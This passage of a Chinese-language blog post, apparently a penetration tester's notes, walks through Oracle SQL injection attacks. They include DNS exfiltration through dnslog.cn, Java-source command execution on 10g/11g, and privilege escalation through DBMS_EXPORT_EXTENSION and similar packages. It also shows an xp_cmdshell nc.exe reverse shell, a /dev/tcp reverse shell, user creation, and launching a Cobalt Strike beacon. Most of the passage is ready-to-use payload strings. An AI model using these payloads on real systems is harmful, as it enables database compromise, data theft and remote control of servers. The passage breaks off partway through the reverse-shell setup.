<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;172.16.49.137&#x2F;oracle.php?id&#x3D;1 and (select utl_http.request(&#39;http:&#x2F;&#x2F;&#39;||(select user from dual)||&#39;.d1a6j9.dnslog.cn&#x2F;&#39;) from dual) is not null</span><br></pre></td></tr></table></figure>

<ul>
<li><code>utl_inaddr.get_host_address</code>将查询结果拼接到域名下，并使用DNS记录解析日志。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;172.16.49.137&#x2F;oracle.php?id&#x3D;1 and (select utl_inaddr.get_host_address((select user from dual)||&#39;.ka255j.dnslog.cn&#39;) from dual) is not null</span><br></pre></td></tr></table></figure>

<ul>
<li><code>SYS.DBMS_LDAP.INIT</code>与 <code>utl_inaddr.get_host_address</code> 类似，很多时候数据服务器都是站库分离的，而且不一定能主动访问外网。但是有时候可能会允许 DNS 请求。并且这个函数在 10g/11g 中是 public 权限。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;172.16.49.137&#x2F;oracle.php?id&#x3D;1 and (select SYS.DBMS_LDAP.INIT((select user from dual)||&#39;.2eo2cw.dnslog.cn&#39;,80) from dual) is not null</span><br></pre></td></tr></table></figure>

<ul>
<li><code>HTTPURITYPE</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;172.16.49.137&#x2F;oracle.php?id&#x3D;1 and (SELECT HTTPURITYPE((select user from dual)||&#39;.j79nme.dnslog.cn&#39;).GETCLOB() FROM DUAL) is not null</span><br></pre></td></tr></table></figure>

<p>Oracle HTTP代理实现跨库攻击</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">union select cast(substr(httpuritype(‘http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;sqlinjection&#x2F;default3.asp’).getclob(),1,1000) as varchar(1000)) from dual--</span><br><span class="line"></span><br><span class="line">union select cast(substr(httpuritype(&#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;sqlinjection&#x2F;default3.asp?qid&#x3D;1&#x2F;**&#x2F;union&#x2F;**&#x2F;all&#x2F;**&#x2F;select&#x2F;**&#x2F;1,@@version,user&#39;).getclob(),1,1000) as varchar(1000)) from dual--</span><br><span class="line"></span><br><span class="line">union select cast(substr(httpuritype(&#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;sqlinjection&#x2F;default3.asp?qid&#x3D;1;exec&#x2F;**&#x2F;master..xp_cmdshell&#x2F;**&#x2F;&quot;C:\nc.exe%20172.16.56.1%204444%20-e%20cmd.exe&quot; &#39;).  getclob(),1,3000) as varchar(3000)) from dual--</span><br></pre></td></tr></table></figure>

<h2 id="Oracle11g-命令执行"><a href="#Oracle11g-命令执行" class="headerlink" title="Oracle11g 命令执行"></a>Oracle11g 命令执行</h2><ul>
<li>直连数据库情况下</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Windows下 通过关键字host</span><br><span class="line">host whoami</span><br><span class="line"></span><br><span class="line"># Linux下 通过关键字符 !</span><br><span class="line">!whoami</span><br></pre></td></tr></table></figure>

<p>11.2.0.1.0 命令执行步骤：</p>
<ol>
<li>创建JAVA Source</li>
<li>赋予执行权限</li>
<li>创建函数</li>
<li>调用函数执行命令</li>
</ol>
<h3 id="dbms-xmlquery-newcontext"><a href="#dbms-xmlquery-newcontext" class="headerlink" title="dbms_xmlquery.newcontext"></a>dbms_xmlquery.newcontext</h3><ul>
<li>创建JAVA Source</li>
</ul>
<p>这里创建表时只有<code>phone</code>字段允许为null,因此需要匹配该字段数据类型，创建JAVA Source。（<code>dbms_xmlquery.newcontext</code>创建JAVA Source时返回为null）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;172.16.49.137&#x2F;oracle.php?id&#x3D;1 union select null,null,null,dbms_xmlquery.newcontext(&#39;declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate &#39;&#39;create or replace and compile java source named &quot;LinxUtil&quot; as import java.io.*; public class LinxUtil extends Object &#123;public static String runCMD(String args) &#123;try&#123;BufferedReader myReader&#x3D; new BufferedReader(new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str&#x3D;&quot;&quot;;while ((stemp &#x3D; myReader.readLine()) !&#x3D; null) str +&#x3D;stemp+&quot;\n&quot;;myReader.close();return str;&#125; catch (Exception e)&#123;return e.toString();&#125;&#125;&#125;&#39;&#39;;commit;end;&#39;) from dual</span><br></pre></td></tr></table></figure>

<p>在数据库直接执行时：</p>
<p><img src="/posts/bb8356a5/010.png" alt="image-20200702093300028"></p>
<p>联合查询时：</p>
<p><img src="/posts/bb8356a5/011.png" alt="image-20200702093117462"></p>
<p>查看<code>all_objects</code>内部的变化。</p>
<p><img src="/posts/bb8356a5/012.png" alt="image-20200702093729519"></p>
<ul>
<li>赋予执行权限</li>
</ul>
<p>我这了测试了三个用户，都不需要执行权限。</p>
<p>cc为system连接，root为root用户连接，test为test连接。</p>
<p><img src="/posts/bb8356a5/013.png" alt="image-20200702142914225"></p>
<p><img src="/posts/bb8356a5/014.png" alt="image-20200702143015246"></p>
<p>提权语句,这里没有用到。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select dbms_xmlquery.newcontext(&#39;declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate &#39;&#39;begin dbms_java.grant_permission( &#39;&#39;&#39;&#39;SYSTEM&#39;&#39;&#39;&#39;, &#39;&#39;&#39;&#39;SYS:java.io.FilePermission&#39;&#39;&#39;&#39;, &#39;&#39;&#39;&#39;&lt;&lt;ALL FILES&gt;&gt;&#39;&#39;&#39;&#39;,&#39;&#39;&#39;&#39;EXECUTE&#39;&#39;&#39;&#39;);end;&#39;&#39;commit;end;&#39;) from dual;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 使用SYS.LT.CREATEWORKSPACE提权 9iR2, 10gR1, 10gR2 and 11gR1     #fixed 2009.7</span><br><span class="line">select dbms_xmlquery.newcontext(&#39;declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate &#39;&#39;</span><br><span class="line">begin SYS.LT.CREATEWORKSPACE(&#39;&#39;&#39;&#39;A10&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39; and TEST.pwn()&#x3D;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;x&#39;&#39;&#39;&#39;);SYS.LT.REMOVEWORKSPA CE(&#39;&#39;&#39;&#39;A10&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39; and TEST.pwn()&#x3D;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;x&#39;&#39;&#39;&#39;);end;&#39;&#39;; commit; end;&#39;) from dual</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 使用sys.dbms_cdc_publish.create_change_set提权 10gR1, 10gR2, 11g R1 and 11gR2   #fixed 2010.10</span><br><span class="line">select dbms_xmlquery.newcontext(&#39;declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate &#39;&#39; begin sys.dbms_cdc_publish.create_change_set(&#39;&#39;&#39;&#39; a&#39;&#39;&#39;&#39;,&#39;&#39;&#39;&#39;a&#39;&#39;&#39;&#39;,&#39;&#39;&#39;&#39;a&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;||TEST.pwn()||&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;a&#39;&#39;&#39;&#39;,&#39;&#39;&#39;&#39;Y&#39;&#39;&#39;&#39;,s ysdate,sysdate);end;&#39;&#39;; commit; end;&#39;) from dual</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 使用GET_DOMAIN_INDEX_TABLES Oracle 8.1.7.4, 9.2.0.1 - 9.2.0.7, 10.1.0.2 - 10.1.0.4, 10.2.0.1-10.2.0.2</span><br><span class="line">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&#39;foo&#39;,&#39;bar&#39;,&#39;DBMS_OUTPUT&quot;.PUT_LINE(:P1); EXECUTE IMMEDIATE &#39;&#39;DECLARE PRAGMA AUTONOMOUS_TRANSACTION; BEGIN EXECUTE IMMEDIATE &#39;&#39;&#39;&#39;grant dba to TEST&#39;&#39;&#39;&#39;; END;&#39;&#39;; END;--&#39;, &#39;&#39;, 0, &#39;1&#39;, 0) from dual</span><br></pre></td></tr></table></figure>

<ul>
<li>创建函数</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;172.16.49.137&#x2F;oracle.php?id&#x3D;1 union select null,null,null,dbms_xmlquery.newcontext(&#39;declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate &#39;&#39;create or replace function LinxRunCMD(p_cmd in varchar2) return varchar2 as language java name &#39;&#39;&#39;&#39;LinxUtil.runCMD(java.lang.String) return String&#39;&#39;&#39;&#39;; &#39;&#39;;commit;end;&#39;) from dual</span><br></pre></td></tr></table></figure>

<p><img src="/posts/bb8356a5/015.png" alt="image-20200701164925448"></p>
<ul>
<li>判断函数是否创建成功</li>
</ul>
<p>查看all_objects表中的是否已经存刚才创建的函数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;172.16.49.137&#x2F;oracle.php?id&#x3D;1 union select null,null,null,OBJECT_ID from all_objects where object_name &#x3D;&#39;LINXRUNCMD&#39;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/bb8356a5/016.png" alt="image-20200701165318737"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from all_objects where object_name like &#39;%LINX%&#39; or object_name like &#39;%Linx%&#39;</span><br></pre></td></tr></table></figure>

<ul>
<li>执行命令</li>
</ul>
<p>注意⚠️：执行命令时候返回的结果是字符串，所以无法用phone字段。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;172.16.49.137&#x2F;oracle.php?id&#x3D;1 union select null,LinxRunCMD(&#39;whoami&#39;),null,null from dual</span><br></pre></td></tr></table></figure>

<p><img src="/posts/bb8356a5/017.png" alt="image-20200701171038862"></p>
<ul>
<li>删除函数</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">drop function LinxRunCMD</span><br></pre></td></tr></table></figure>

<p>以上测试是在system用户下进行，那么如果没有DBA权限呢？</p>
<p><img src="/posts/bb8356a5/018.png" alt="image-20200702151015602"></p>
<p>这里使用ROOT用户，根据上述过程，依旧可以。</p>
<p><img src="/posts/bb8356a5/019.png" alt="image-20200702151119873"></p>
<p><strong>以下函数均不能在11.2.0.1.0上正常执行命令。（这里是我自己的测试环境- -）</strong></p>
<h3 id="DBMS-JAVA-TEST-FUNCALL"><a href="#DBMS-JAVA-TEST-FUNCALL" class="headerlink" title="DBMS_JAVA_TEST.FUNCALL()"></a>DBMS_JAVA_TEST.FUNCALL()</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Select DBMS_JAVA_TEST.FUNCALL(&#39;oracle&#x2F;aurora&#x2F;util&#x2F;Wrapper&#39;,&#39;main&#39;,&#39;c:\\Windows\\System32\\cmd.exe&#39;,&#39;&#x2F;c&#39;,&#39;whoami&#39;) from dual;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/bb8356a5/020.png" alt="image-20200702115920307"></p>
<h3 id="DBMS-JAVA-RUNJAVA"><a href="#DBMS-JAVA-RUNJAVA" class="headerlink" title="DBMS_JAVA.RUNJAVA()"></a>DBMS_JAVA.RUNJAVA()</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT DBMS_JAVA.RUNJAVA(&#39;oracle&#x2F;aurora&#x2F;util&#x2F;Wrapper  c:\\Windows\\System32\\cmd.exe &#x2F;c whoami&#39;) FROM DUAL</span><br></pre></td></tr></table></figure>

<p><img src="/posts/bb8356a5/021.png" alt="image-20200702141620519"> </p>
<h3 id="DBMS-REPCAT-RPC-VALIDATE-REMOTE-RC"><a href="#DBMS-REPCAT-RPC-VALIDATE-REMOTE-RC" class="headerlink" title="DBMS_REPCAT_RPC.VALIDATE_REMOTE_RC"></a>DBMS_REPCAT_RPC.VALIDATE_REMOTE_RC</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select sys.DBMS_REPCAT_RPC.VALIDATE_REMOTE_RC(USER,&#39;VALIDATE_GRP_OBJECTS_LOCAL(:canon_gname);EXECUTE IMMEDIATE &#39;&#39;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#39;&#39;&#39;&#39;create or replace and compile java source named &quot;LinxUtil&quot; as import java.io.*; public class LinxUtil extends Object &#123;public static String runCMD(String args) &#123;try&#123;BufferedReader myReader&#x3D; new BufferedReader(new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str&#x3D;&quot;&quot;;while ((stemp &#x3D; myReader.readLine()) !&#x3D; null) str +&#x3D;stemp+&quot;\n&quot;;myReader.close();return str;&#125; catch (Exception e)&#123;return e.toString();&#125;&#125;public static String readFile(String filename)&#123;try&#123;BufferedReader myReader&#x3D; new BufferedReader(new FileReader(filename)); String stemp,str&#x3D;&quot;&quot;;while ((stemp &#x3D; myReader.readLine()) !&#x3D; null) str +&#x3D;stemp+&quot;\n&quot;;myReader.close();return str;&#125; catch (Exception e)&#123;return e.toString();&#125;&#125;&#125;&#39;&#39;&#39;&#39;;END;&#39;&#39;;END;--&#39;,&#39;CCCCC&#39;) from dual</span><br></pre></td></tr></table></figure>

<p><img src="/posts/bb8356a5/022.png" alt="image-20200702143522190"></p>
<h3 id="另外一种方式"><a href="#另外一种方式" class="headerlink" title="另外一种方式"></a>另外一种方式</h3><p>参考别人的，需要DBA权限，在本地测试不成功。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39; and (select SYS.KUPP$PROC.CREATE_MASTER_PROCESS(&#39;DBMS_SCHEDULER.create_program(&#39;&#39;myprog10&#39;&#39;,&#39;&#39;EXECUTABLE&#39;&#39;,&#39;&#39;net user pwnedfromweb pwn3d!! &#x2F;add&#39;&#39;,0,TRUE);DBMS_SCHEDULER.create_job(job_name&#x3D;&gt;&#39;&#39;myjob10&#39;&#39;,program_name&#x3D;&gt;&#39;&#39;myprog10&#39;&#39;,start_date&#x3D;&gt;NULL,repeat_interval&#x3D;&gt;NULL,end_date&#x3D;&gt;NULL,enabled&#x3D;&gt;TRUE,auto_drop&#x3D;&gt;TRUE);dbms_lock.sleep(1);dbms_scheduler.drop_program(program_name&#x3D;&gt;&#39;&#39;myprog10&#39;&#39;);dbms_scheduler.purge_log;&#39;)from dual) is not null --</span><br></pre></td></tr></table></figure>

<h2 id="Oracle-10g-命令执行"><a href="#Oracle-10g-命令执行" class="headerlink" title="Oracle 10g 命令执行"></a>Oracle 10g 命令执行</h2><p>Server 2003下<code>10.2.0.1.0</code>。</p>
<h3 id="DBMS-EXPORT-EXTENSION"><a href="#DBMS-EXPORT-EXTENSION" class="headerlink" title="DBMS_EXPORT_EXTENSION"></a>DBMS_EXPORT_EXTENSION</h3><p>输出扩展功能包，其中存在三个危险函数，get_domian_index_metadata，get_v2_domain_index_tables，get_domain_index_tables。都是以sys权限定义，默认低权限用户可以调用。</p>
<ul>
<li>首先创建 JAVA Source</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Linux </span><br><span class="line">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&#39;FOO&#39;,&#39;BAR&#39;,&#39;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &#39;&#39;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#39;&#39;&#39;&#39;create or replace and compile java source named &quot;LinxUtil&quot; as import java.io.*; public class LinxUtil extends Object &#123;public static String runCMD(String args)&#123;try&#123;BufferedReader myReader&#x3D; new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str&#x3D;&quot;&quot;;while ((stemp &#x3D; myReader.readLine()) !&#x3D; null) str +&#x3D;stemp+&quot;\n&quot;;myReader.close();return str;&#125; catch (Exception e)&#123;return e.toString();&#125;&#125;public static String readFile(String filename)&#123;try&#123;BufferedReader myReader&#x3D; new BufferedReader(new FileReader(filename)); String stemp,str&#x3D;&quot;&quot;;while ((stemp &#x3D; myReader.readLine()) !&#x3D; null) str +&#x3D;stemp+&quot;\n&quot;;myReader.close();return str;&#125; catch (Exception e)&#123;return e.toString();&#125;&#125;&#125;&#39;&#39;&#39;&#39;;END;&#39;&#39;;END;--&#39;,&#39;SYS&#39;,0,&#39;1&#39;,0) from dual</span><br><span class="line"></span><br><span class="line"># Windows</span><br><span class="line"># 出现截断问题，导致dir,tasklist等命令无法执行，可以执行whoami,ipconfig等。。</span><br><span class="line">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&#39;FOO&#39;,&#39;BAR&#39;,&#39;DBMS_OUTPUT&quot; .PUT(:P1);EXECUTE IMMEDIATE &#39;&#39;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#39;&#39;&#39;&#39;create or replace and compile java source named &quot;Command&quot; as import java.io.*;public class Command&#123;public static String exec(String cmd) throws Exception&#123;String sb&#x3D;&quot;&quot;;BufferedInputStream in &#x3D; new BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream());BufferedReader inBr &#x3D; new BufferedReader(new InputStreamReader(in));String lineStr;while ((lineStr &#x3D; inBr.readLine()) !&#x3D; null)sb+&#x3D;lineStr+&quot;\n&quot;;inBr.close();in.close();return sb;&#125;&#125;&#39;&#39;&#39;&#39;;END;&#39;&#39;;END;--&#39;,&#39;SYS&#39;,0,&#39;1&#39;,0) from dual</span><br></pre></td></tr></table></figure>

<ul>
<li>赋予执行权限</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Linux</span><br><span class="line">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&#39;FOO&#39;,&#39;BAR&#39;,&#39;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &#39;&#39;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#39;&#39;&#39;&#39;begin dbms_java.grant_permission(&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;PUBLIC&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;, &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;SYS:java.io.FilePermission&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;,&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&lt;&gt;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;, &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;execute&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;);end;&#39;&#39;&#39;&#39;;END;&#39;&#39;;END;--&#39;,&#39;SYS&#39;,0,&#39;1&#39;,0) from dual</span><br><span class="line"></span><br><span class="line"># Windows</span><br><span class="line">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&#39;FOO&#39;,&#39;BAR&#39;,&#39;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &#39;&#39;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#39;&#39;&#39;&#39;begin dbms_java.grant_permission( &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;PUBLIC&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;, &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;SYS:java.io.FilePermission&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;, &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&lt;&lt;ALL FILES&gt;&gt;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;, &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;execute&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39; );end;&#39;&#39;&#39;&#39;;END;&#39;&#39;;END;--&#39;,&#39;SYS&#39;,0,&#39;1&#39;,0) from dual</span><br></pre></td></tr></table></figure>

<ul>
<li>创建函数，返回值为null</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Linux</span><br><span class="line">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&#39;FOO&#39;,&#39;BAR&#39;,&#39;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &#39;&#39;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#39;&#39;&#39;&#39;create or replace function LinxRunCMD(p_cmd in varchar2) return varchar2 as language java name&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;LinxUtil.runCMD(java.lang.String) return String&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;;&#39;&#39;&#39;&#39;;END;&#39;&#39;;END;--&#39;,&#39;SYS&#39;,0,&#39;1&#39;,0) from dual</span><br><span class="line"></span><br><span class="line"># Windows</span><br><span class="line">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&#39;FOO&#39;,&#39;BAR&#39;,&#39;DBMS_OUTPUT&quot; .PUT(:P1);EXECUTE IMMEDIATE &#39;&#39;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#39;&#39;&#39;&#39;create or replace function cmd(p_cmd in varchar2) return varchar2 as language java name &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;Command.exec(java.lang.String) return String&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;; &#39;&#39;&#39;&#39;;END;&#39;&#39;;END;--&#39;,&#39;SYS&#39;,0,&#39;1&#39;,0) from dual</span><br></pre></td></tr></table></figure>

<ul>
<li>赋予函数执行权限</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Linux</span><br><span class="line">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&#39;FOO&#39;,&#39;BAR&#39;,&#39;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &#39;&#39;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#39;&#39;&#39;&#39;grant all on LinxRunCMD to public&#39;&#39;&#39;&#39;;END;&#39;&#39;;END;--&#39;,&#39;SYS&#39;,0,&#39;1&#39;,0) from dual</span><br><span class="line"></span><br><span class="line"># Windows</span><br><span class="line">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&#39;FOO&#39;,&#39;BAR&#39;,&#39;DBMS_OUTPUT&quot; .PUT(:P1);EXECUTE IMMEDIATE &#39;&#39;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#39;&#39;&#39;&#39;grant all on cmd to public&#39;&#39;&#39;&#39;;END;&#39;&#39;;END;--&#39;,&#39;SYS&#39;,0,&#39;1&#39;,0) from dual</span><br></pre></td></tr></table></figure>

<ul>
<li>执行命令</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># ⚠️注意：该方法在Windows无法适用截断问题- - 只能执行连续字符命令，结果输出带有截断也无法，。。执行dir直接卡死了。。</span><br><span class="line">select sys.LinxRunCMD(&#39;&#x2F;bin&#x2F;bash -c &#x2F;usr&#x2F;bin&#x2F;whoami&#39;) from dual</span><br><span class="line"># ⚠️注意：结果中带有截断字符则报错。比如:net user，直接执行.exe没问题。这里为CS的🐎</span><br><span class="line">select sys.cmd(&#39;C:\Documents and Settings\Administrator\桌面\beacon.exe&#39;) from dual</span><br></pre></td></tr></table></figure>

<p><img src="/posts/bb8356a5/023.png"></p>
<h3 id="dbms-xmlquery-newcontext-1"><a href="#dbms-xmlquery-newcontext-1" class="headerlink" title="dbms_xmlquery.newcontext"></a>dbms_xmlquery.newcontext</h3><p>在本地Windows下10g没有成功，11g是可以的。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 创建JAVA包</span><br><span class="line">select dbms_xmlquery.newcontext(&#39;declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate &#39;&#39;create or replace and compile java source named &quot;LinxUtil&quot; as import java.io.*; public class LinxUtil extends Object &#123;public static String runCMD(String args) &#123;try&#123;BufferedReader myReader&#x3D; new BufferedReader(new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str&#x3D;&quot;&quot;;while ((stemp &#x3D; myReader.readLine()) !&#x3D; null) str +&#x3D;stemp+&quot;\n&quot;;myReader.close();return str;&#125; catch (Exception e)&#123;return e.toString();&#125;&#125;&#125;&#39;&#39;;commit;end;&#39;) from dual;</span><br><span class="line"></span><br><span class="line"># 赋予当前用户JAVA权限， 赋权失败会报错。</span><br><span class="line">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&#39;FOO&#39;,&#39;BAR&#39;,&#39;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &#39;&#39;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#39;&#39;&#39;&#39;begin dbms_java.grant_permission(&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;YY&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;, &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;SYS:java.io.FilePermission&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;,&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&lt;&lt;ALL FILES&gt;&gt;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;, &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;execute&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;);end;&#39;&#39;&#39;&#39;;END;&#39;&#39;;END;--&#39;,&#39;SYS&#39;,0,&#39;1&#39;,0) from dual;</span><br><span class="line"></span><br><span class="line"># 创建函数</span><br><span class="line">select dbms_xmlquery.newcontext(&#39;declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate &#39;&#39;create or replace function LinxRunCMD(p_cmd in varchar2) return varchar2 as language java name &#39;&#39;&#39;&#39;LinxUtil.runCMD(java.lang.String) return String&#39;&#39;&#39;&#39;; &#39;&#39;;commit;end;&#39;) from dual;</span><br><span class="line"></span><br><span class="line"># 删除创建的函数</span><br><span class="line">drop function LinxRunCMD</span><br><span class="line"># 执行命令</span><br><span class="line">select LinxRunCMD(&#39;whoami&#39;) from dual</span><br></pre></td></tr></table></figure>

<h3 id="Linux反弹shell"><a href="#Linux反弹shell" class="headerlink" title="Linux反弹shell"></a>Linux反弹shell</h3><ul>
<li>创建JAVA Source</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&#39;FOO&#39;,&#39;BAR&#39;,&#39;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &#39;&#39;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#39;&#39;&#39;&#39;create or replace and compile java source named &quot;shell&quot; as import java.io.*;import java.net.*;public class shell &#123;public static void run() throws Exception&#123;String[] aaa&#x3D;&#123;&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-c&quot;,&quot;exec 9&lt;&gt; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;8080;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;&#x2F;bin&#x2F;sh&quot;&#125;;Process p&#x3D;Runtime.getRuntime().exec(aaa);&#125;&#125;&#39;&#39;&#39;&#39;;END;&#39;&#39;;END;--&#39;,&#39;SYS&#39;,0,&#39;1&#39;,0) from dual</span><br></pre></td></tr></table></figure>

<ul>
<li>授予权限</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&#39;FOO&#39;,&#39;BAR&#39;,&#39;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &#39;&#39;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#39;&#39;&#39;&#39;begin dbms_java.grant_permission( &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;PUBLIC&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;, &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;SYS:java.net.SocketPermission&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;, &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&lt;&gt;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;, &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;*&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39; );end;&#39;&#39;&#39;&#39;;END;&#39;&#39;;END;--&#39;,&#39;SYS&#39;,0,&#39;1&#39;,0) from dual</span><br></pre></td></tr></table></figure>

<ul>
<li>创建函数</li>
</ul>
